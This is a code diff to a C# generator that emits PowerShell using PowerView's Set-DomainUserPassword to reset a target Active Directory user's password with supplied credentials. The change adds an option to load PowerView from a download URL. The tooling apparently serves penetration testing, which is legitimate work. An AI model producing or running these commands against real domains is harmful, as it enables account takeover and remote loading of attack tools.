@@ -10,7 +10,9 @@ public static class SetDomainUserPasswordGenerator
         string targetIdentity,
         string credentialPassword,
         string newTargetPassword,
-        bool secureMode)
+        bool secureMode,
+        bool download,
+        string downloadUrl)
     {
         string account = GeneratorHelpers.EscapeSingleQuotes(domain) + "\\" + GeneratorHelpers.EscapeSingleQuotes(username);
         string identity = GeneratorHelpers.EscapeSingleQuotes(targetIdentity);
@@ -25,7 +27,7 @@ public static class SetDomainUserPasswordGenerator
                 "",
                 $"$TargetPassword = Read-Host \"New password for {identity}\" -AsSecureString",
                 "",
-                GeneratorHelpers.PowerViewImport,
+                GeneratorHelpers.PowerViewImportLine(download, downloadUrl),
                 "",
                 $"Set-DomainUserPassword -Identity '{identity}' -AccountPassword $TargetPassword -Credential $Cred -Verbose");
         }
@@ -39,7 +41,7 @@ public static class SetDomainUserPasswordGenerator
             "",
             $"$TargetPassword = ConvertTo-SecureString '{GeneratorHelpers.EscapeSingleQuotes(newTargetPassword)}' -AsPlainText -Force",
             "",
-            GeneratorHelpers.PowerViewImport,
+            GeneratorHelpers.PowerViewImportLine(download, downloadUrl),
             "",
             $"Set-DomainUserPassword -Identity '{identity}' -AccountPassword $TargetPassword -Credential $Cred -Verbose");
     }
